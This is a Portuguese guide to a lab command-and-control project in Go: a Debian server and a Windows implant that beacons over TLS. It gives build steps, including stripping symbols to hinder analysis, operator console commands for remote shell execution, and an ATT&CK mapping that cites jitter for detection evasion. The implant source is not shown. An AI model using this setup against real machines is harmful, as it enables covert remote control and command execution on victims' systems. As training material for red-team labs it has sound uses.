## Arquitetura do projeto

  ```
implant (Win10 lab) ──POST /beacon──► server (Debian) ──► fila de tasks
        ▲                                    │
        └──── resposta: tasks cifradas ──────┘

Fluxo: implant dorme N±jitter segundos → manda resultados + pede tarefas
       → operador enfileira comandos via console → beacon seguinte executa
 
  ```

O padrão "pede-tarefa-na-resposta" é exatamente como Cobalt Strike/Sliver funcionam (o beacon nunca recebe conexão de entrada — só ele inicia conexão, o que ajuda no OPSEC).


## Estrutura do repositório

 ```

lab-c2/
├── go.mod
├── internal/
│   └── proto/
│       └── proto.go      ← código compartilhado (crypto + mensagens)
├── server/
│   └── main.go           ← o C2 (listener + console)
└── implant/
    └── main.go           ← o agente que roda no alvo

 ```

## Compilando no Debian 12

 ```

# Instalar Go
sudo apt install -y golang-go

# Dentro da pasta do projeto
cdlab-c2

# O interno compartilhado precisa estar no módulo; organização já está ok.
# Compila o SERVIDOR (roda no próprio Debian):
go build -o c2-server ./server/

# Cross-compile o IMPLANT para Windows x64 (um comando só — a mágica do Go):
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o implant.exe ./implant/

 ```

 ```
ldflags="-s -w" 

 ```
— strip de símbolos e debug info, binário menor (e menos strings para análise superficial)

## Rodando o lab

* No Debian (atacante):

```
./c2-server -port 443 -secret "chave-super-secreta-do-lab"

```

## Na VM Windows 10 (lab):

```
implant.exe
```

* Em segundos verá no console do C2:

```
15:04:05 [*] C2 escutando em https://0.0.0.0:443/api/v1/beacon
15:04:22 [+] NOVO IMPLANTE a1b2c3d4 — windows\aluno @ LAB-PC (pid 4812)

```

* No console do C2:

```
c2> implants
c2> shell a1b2c3d4 whoami
c2> sleep a1b2c3d4 60        ; sobe o beacon para 60s — mais "quieto"
c2> kill a1b2c3d4
```


** Este projeto cobre um mapa ATT&CK:

```
| **Comportamento do código** | **Técnica ATT&CK** |  |
| --- | --- | --- |
| Coleta de hostname/user no check-in | T1082 (System Info Discovery) |  |
| Execução `cmd /C` | T1059.003 (Windows Command Shell) |  |
| Beaconing HTTP sobre TLS | T1071.001 (Web Protocols) |  |
| Canal cifrado AES-GCM + autenticação | T1573.001 (Encrypted Channel) |  |
| Jitter no sleep | OPSEC / evasion de detecção por análise de tráfego |  |
| Sem conexão de entrada (pull puro) | T1090 inverso — o agente nunca escuta porta |  |

``` 

